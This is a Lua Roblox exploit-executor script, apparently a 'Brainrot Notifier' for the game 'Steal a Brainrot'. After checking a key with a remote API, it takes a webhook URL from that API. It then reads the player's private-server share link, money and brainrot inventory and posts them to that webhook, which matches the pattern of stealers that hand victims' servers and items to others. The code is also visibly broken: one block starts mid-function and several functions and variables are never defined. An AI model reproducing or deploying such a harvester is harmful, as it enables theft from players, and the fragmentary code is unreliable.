local function validarKey()
    local req = syn and syn.request or http_request or request or http.request
    if not req then return false, "Executor sem suporte HTTP." end

    local hwid = tostring(LocalPlayer.UserId)
    
    local ok, res = pcall(function()
        return req({
            Url = API_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({key = API_KEY, hwid = hwid})
        })
    end)

    if ok and res and res.StatusCode == 200 then
        local data = HttpService:JSONDecode(res.Body)
        if data.sucesso then
            WEBHOOK_USUARIO = data.webhook
            return true, "OK"
        end
    end
    return false, "Key inválida ou já em uso."
end

local isKeyValid, motivo = validarKey()
if not isKeyValid then
    LocalPlayer:Kick("❌ Falha na validação: " .. motivo)
    return
end

--=============================================================
local function validarLinkServidor(link)
    if type(link) ~= "string" then return false, "Link inválido" end
    link = link:gsub("^%s+", ""):gsub("%s+$", "")
    if link == "" then return false, "Link vazio" end
    
    local dominioOk = link:match("^https?://[w%.]*roblox%.com/") or link:match("^[w%.]*roblox%.com/")
    if not dominioOk then return false, "Não é um link do Roblox" end
    
    if not link:lower():find("/share", 1, true) then return false, "Não é um link de compartilhamento" end
    
    local tipo = link:match("[?&]type=([^&#]+)")
    if not tipo or tipo:lower() ~= "server" then return false, "Não é um link de servidor" end
    
    local code = link:match("[?&]code=([^&#]+)")
    if not code or #code ~= 32 or not code:match("^[0-9a-fA-F]+$") then return false, "Código de servidor inválido" end

    return true, "OK"
end

local function getMeuDinheiro()
    local ls = LocalPlayer:FindFirstChild("leaderstats")
    if ls then
        for _, v in ipairs(ls:GetChildren()) do
            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
                return tostring(v.Value)
            end
        end
        local first = ls:GetChildren()[1]
        if first then return tostring(first.Value) end
    end
    return "Desconhecido"
end

local function sendWebhook(title, description, color)
    if not WEBHOOK_USUARIO then return end

    local qtdPlayers = #Players:GetPlayers()
    local dinheiro = getMeuDinheiro()

    local payload = {
        username = "Brainrot Notifier",
        avatar_url = "https://i.imgur.com/8Km9tLL.png",
        embeds = {{
            title = tostring(title),
            description = tostring(description),
            color = color or 0x2ECC71,
            fields = {
                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
            },
            footer = { text = "Jogador: " .. LocalPlayer.Name },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
    if not ok then return end
    
    local function req(args)
        if syn and syn.request then syn.request(args)
        elseif request then request(args)
        elseif http_request then http_request(args)
        elseif http and http.request then http.request(args) end
    end
    
    task.spawn(function()
        pcall(function() 
            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
        end)
    end)
end

local function isOnConveyor(position)
    local rayOrigin = position + Vector3.new(0, 2, 0)
    local rayDirection = Vector3.new(0, -10, 0)
    
    local raycastParams = RaycastParams.new()
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    if LocalPlayer.Character then
        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
    end
    
    local rayResult = Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
    
    if rayResult and rayResult.Instance then
        local hitPart = rayResult.Instance
        
        if hitPart:IsA("BasePart") then
            local color = hitPart.Color
            if color.R > 0.6 and color.G < 0.4 and color.B < 0.4 then
                return true
            end
        end
        
        if hitPart.Name:lower():match("conveyor") or 
           hitPart.Name:lower():match("belt") or
           hitPart.Name:lower():match("esteira") or
           hitPart.Name:lower():match("path") then
            return true
        end
        
        local ancestor = hitPart.Parent
        while ancestor and ancestor ~= Workspace do
            if ancestor.Name:lower():match("conveyor") or
               ancestor.Name:lower():match("belt") or
               ancestor.Name:lower():match("path") then
                return true
            end
            ancestor = ancestor.Parent
        end
    end
    
    return false
end

local function getAllTextsFromGui(gui)
    local texts = {}
    
    local function searchText(parent)
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("TextLabel") or child:IsA("TextButton") then
                if child.Visible and child.Text and child.Text ~= "" and child.Text ~= " " then
                    table.insert(texts, child.Text)
                end
            elseif child:IsA("TextBox") then
                if child.Visible and child.Text and child.Text ~= "" and child.Text ~= " " then
                    table.insert(texts, child.Text)
                end
            end
            
            if #child:GetChildren() > 0 then
                searchText(child)
            end
        end
    end
    
    if gui then
        searchText(gui)
    end
    return texts
end

local function getGuiPosition(billboard)
    if billboard.Adornee then
        if billboard.Adornee:IsA("BasePart") then
            return billboard.Adornee.Position
        elseif billboard.Adornee:IsA("Attachment") then
            local part = billboard.Adornee.Parent
            if part and part:IsA("BasePart") then
                return part.Position
            end
        end
    end
    
    if billboard.Parent then
        if billboard.Parent:IsA("BasePart") then
            return billboard.Parent.Position
        elseif billboard.Parent:IsA("Model") then
            local model = billboard.Parent
            if model.PrimaryPart then
                return model.PrimaryPart.Position
            end
            for _, part in ipairs(model:GetChildren()) do
                if part:IsA("BasePart") then
                    return part.Position
                end
            end
        end
    end
    
    local model = billboard:FindFirstAncestorOfClass("Model")
    if model then
        if model.PrimaryPart then
            return model.PrimaryPart.Position
        end
        for _, part in ipairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                return part.Position
            end
        end
    end
    
    return nil
end

local function extractValue(text)
    if not text then return nil end
    
    local cleanText = text:gsub("%$", ""):gsub(",", "")
    
    local valueK = cleanText:match("([%d%.]+)K")
    if valueK then return tonumber(valueK) * 1000 end
    
    local valueM = cleanText:match("([%d%.]+)M")
    if valueM then return tonumber(valueM) * 1000000 end
    
    local valueB = cleanText:match("([%d%.]+)B")
    if valueB then return tonumber(valueB) * 1000000000 end
    
    local value = cleanText:match("([%d%.]+)")
    if value then return tonumber(value) end
    
    return nil
end

local function findBrainrotName(texts)
    local candidateNames = {}
    
    for _, text in ipairs(texts) do
        local textLower = text:lower()
        
        if not text:match("%$") and 
           not text:match("/s") and 
           not text:match("^%d+$") and
           not text:match("^%d+x") and
           not textLower:match("^legendary$") and
           not textLower:match("^mythic$") and
           not textLower:match("^rare$") and
           not textLower:match("^uncommon$") and
           not textLower:match("^common$") and
           not textLower:match("^collect$") and
           not textLower:match("^owned$") and
           not textLower:match("^equipped$") and
           not textLower:match("^level%s*%d") and
           #text >= 3 then
            
            if isValidBrainrot(text) then
                table.insert(candidateNames, text)
            end
        end
    end
    
    if #candidateNames == 0 then
        return nil
    end
    
    table.sort(candidateNames, function(a, b)
        local aIsTitle = a:match("^%u") ~= nil
        local bIsTitle = b:match("^%u") ~= nil
        
        if aIsTitle and not bIsTitle then
            return true
        elseif bIsTitle and not aIsTitle then
            return false
        end
        
        return #a > #b
    end)
    
    return candidateNames[1]
end

local function formatValue(value)
    if value >= 1000000000 then
        return string.format("%.2fB", value / 1000000000)
    elseif value >= 1000000 then
        return string.format("%.2fM", value / 1000000)
    elseif value >= 1000 then
        return string.format("%.2fK", value / 1000)
    else
        return tostring(math.floor(value))
    end
end

                        for _, text in ipairs(texts) do
                            if text:match("/s") or text:match("/S") then
                                local value = extractValue(text)
                                if value and value > 0 then
                                    hasGenerationValue = true
                                    if value > generationValue then
                                        generationValue = value
                                    end
                                end
                            end
                        end
                        
                        if hasGenerationValue and generationValue > 0 then
                            local onConveyor = isOnConveyor(position)
                            
                            if not onConveyor then
                                local name = findBrainrotName(texts)
                                
                                if name and isValidBrainrot(name) then
                                    local guid = string.format("%s_%.2f_%.2f_%.2f", name, position.X, position.Y, position.Z)
                                    
                                    if not processedGuids[guid] then
                                        processedGuids[guid] = true
                                        
                                        table.insert(brainrots, {
                                            Name = name,
                                            GenerationRate = generationValue
                                        })
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    
    if #brainrots == 0 then
        return "Nenhum brainrot encontrado."
    end
    
    local counts = {}
    local generationRates = {}
    
    for _, brainrot in ipairs(brainrots) do
        if brainrot and brainrot.Name then
            local name = brainrot.Name
            counts[name] = (counts[name] or 0) + 1
            local currentRate = brainrot.GenerationRate or 0
            if not generationRates[name] or currentRate > generationRates[name] then
                generationRates[name] = currentRate
            end
        end
    end
    
    local items = {}
    for name, qty in pairs(counts) do
        local genRate = generationRates[name] or 0
        table.insert(items, {
            name = name,
            qty = qty,
            rate = genRate,
            formatted = string.format("• %s (%s/s)", name, formatValue(genRate))
        })
    end
    
    table.sort(items, function(a, b)
        return a.rate > b.rate
    end)
    
    local formattedItems = {}
    for _, item in ipairs(items) do
        table.insert(formattedItems, item.formatted)
    end
    
    return #formattedItems > 0 and table.concat(formattedItems, "\n") or "Nenhum brainrot encontrado."
end

local function enviarBrainrots(link)
    local baseName = "Sua Base"
    local brainrotsText = getBrainrotsString()
    
    local linhas = {}
    table.insert(linhas, "**Link:** [clique aqui para abrir](" .. link .. ")")
    table.insert(linhas, "**Base:** `" .. baseName .. "`\n")

    table.insert(linhas, brainrotsText)

    sendWebhook("🔗 Servidor Privado Informado", table.concat(linhas, "\n"), 0x2ECC71)
end
